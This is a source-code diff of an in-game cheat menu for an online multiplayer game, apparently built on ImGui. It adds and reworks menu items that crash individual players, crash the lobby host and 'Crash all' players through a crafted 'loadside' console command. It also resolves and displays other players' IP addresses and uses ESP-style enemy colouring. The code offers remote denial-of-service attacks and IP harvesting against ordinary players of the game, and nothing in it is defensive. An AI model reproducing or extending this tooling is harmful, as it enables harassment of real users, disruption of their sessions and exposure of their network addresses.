@@ -119,9 +119,23 @@ namespace menu
 		return true;
 	}
 
+	bool selectable(const std::string& label, bool enabled, bool noprint)
+	{
+		const auto result = ImGui::Selectable(label,
+			false,
+			ImGuiSelectableFlags_DontClosePopups | (enabled ? ImGuiSelectableFlags_None : ImGuiSelectableFlags_Disabled));
+
+		if (result && !noprint)
+		{
+			utils::toast::add_toast("Game", "Executed: " + label);
+		}
+
+		return result;
+	}
+
 	void draw_player_list(const float width, const float spacing)
 	{
-		const auto draw_friend_name = [=](const game::netadr_t& target, const std::string& player_name, const std::uint64_t steam_id)
+		const auto draw_friend_name = [=](const std::string& player_name, const std::uint64_t steam_id)
 		{
 			for (const auto& friends : friends::friends)
 			{
@@ -179,23 +193,24 @@ namespace menu
 
 			for (const auto& client_num : indices)
 			{
-				const auto target_client = &session->clients[client_num];
-				const auto client = &game::cg()->clients[client_num];
+				const auto target_client = session->clients[client_num].activeClient;
 
-				if (target_client->activeClient)
+				if (target_client)
 				{
 					ImGui::AlignTextToFramePadding();
 					ImGui::TextUnformatted(std::to_string(client_num).data());
 
 					ImGui::NextColumn();
 
-					const auto player_xuid = target_client->activeClient->fixedClientInfo.xuid;
-					const auto player_name = target_client->activeClient->fixedClientInfo.gamertag;
+					const auto player_xuid = target_client->fixedClientInfo.xuid;
+					const auto player_name = target_client->fixedClientInfo.gamertag;
 
 					if (in_game)
 					{
+						const auto client = game::cg()->clients[client_num]; 
+
 						ImGui::PushStyleColor(ImGuiCol_Text, client_num == our_client_num ? ImColor(0, 255, 127, 250).Value
-							: (client->team == game::TEAM_FREE || client->team != game::cg()->clients[our_client_num].team)
+							: (client.team == game::TEAM_FREE || client.team != game::cg()->clients[our_client_num].team)
 							? esp::enemy_color : esp::friendly_color);
 					}
 					else
@@ -216,22 +231,22 @@ namespace menu
 						ImGui::TextColored(ImColor(200, 200, 200, 250).Value, "(%s)", steam_name.data());
 					}
 
-					const auto netadr = target_client->activeClient->sessionInfo[session->type].netAdr;
+					const auto netadr = game::get_session_netadr(target_client);
 
-					draw_friend_name(netadr, player_name, player_xuid); 
+					draw_friend_name(player_name, player_xuid); 
 					
 					const auto popup = "player_popup##" + std::to_string(client_num);
-					static auto friend_player_name = ""s;
 
 					if (selected)
 					{
-						friend_player_name = player_name; 
 						exploit::lobby_msg::send_connection_test(netadr, player_xuid);
-						
 						ImGui::OpenPopup(popup.data());
 					}
 
-					const auto ip_string = utils::string::adr_to_string(&netadr);
+					game::XNADDR xn;
+					game::dwNetadrToCommonAddr(netadr, &xn, sizeof xn, nullptr);
+					
+					const auto ip_string = xn.to_string(true);
 
 					if (ImGui::BeginPopup(popup.data(), ImGuiWindowFlags_NoMove))
 					{
@@ -251,6 +266,8 @@ namespace menu
 
 							if (ImGui::BeginMenu("Add to friends list##" + std::to_string(client_num)))
 							{
+								static auto friend_player_name = ""s;
+
 								ImGui::InputTextWithHint("##" + std::to_string(client_num), "Name", &friend_player_name);
 
 								if (ImGui::Button("Add friend"))
@@ -288,13 +305,7 @@ namespace menu
 							
 							if (ImGui::MenuItem("Crash"))
 							{
-								if (freeze)
-								{
-									exploit::instant_message::send_info_response_overflow({ player_xuid });
-									exploit::lobby_msg::send_server_info_overflow(netadr, player_xuid);
-								}
-								
-								exploit::send_crash(netadr, player_xuid);
+								exploit::send_crash(netadr, player_xuid, freeze);
 							}
 
 							ImGui::EndMenu();
@@ -387,7 +398,7 @@ namespace menu
 				return;
 			}
 
-			if (ImGui::BeginTabBar("tabs"))
+			if (ImGui::BeginTabBar("Tabs"))
 			{
 				ImGui::Separator();
 
@@ -446,23 +457,16 @@ namespace menu
 				{
 					if (begin_section("Player name"))
 					{
-						static std::string player_name = game::LiveUser_GetClientName(0);
-
 						ImGui::SetNextItemWidth(width * 0.45f);
-						ImGui::InputTextWithHint("##player_name", "Name", &player_name);
-
-						ImGui::SameLine();
-
-						if (ImGui::Button("Set##set_player_name"))
-						{
-							steam::persona_name = player_name;
-						}
+						ImGui::InputTextWithHint("##player_name", "Name", &steam::persona_name);
 					}
 
 					ImGui::Checkbox("Log out-of-band packets", &events::connectionless_packet::log_commands);
 					ImGui::Checkbox("Log instant messages", &events::instant_message::log_messages);
 					ImGui::Checkbox("Log lobby messages", &events::lobby_msg::log_messages);
-					ImGui::Checkbox("Prevent join requests", &events::instant_message::prevent_join);
+					ImGui::Checkbox("Log server commands", &events::server_command::log_commands);
+					ImGui::Checkbox("Prevent join", &events::prevent_join);
+					ImGui::Checkbox("Don't update presence", &events::update_presence);
 
 					if (ImGui::CollapsingHeader("Removals", ImGuiTreeNodeFlags_Leaf))
 					{
@@ -502,6 +506,11 @@ namespace menu
 							command::execute("mr " + std::to_string(game::cl()->serverId) + " 0 endround");
 						}
 
+						if (ImGui::MenuItem("Crash all"))
+						{
+							command::execute("loadside 0 "s + game::ui_mapname->current.string + " 0 0");
+						}
+						
 						if (ImGui::MenuItem("Crash server"))
 						{
 							exploit::send_crash(game::session->host.info.netAdr, game::session->host.info.xuid);
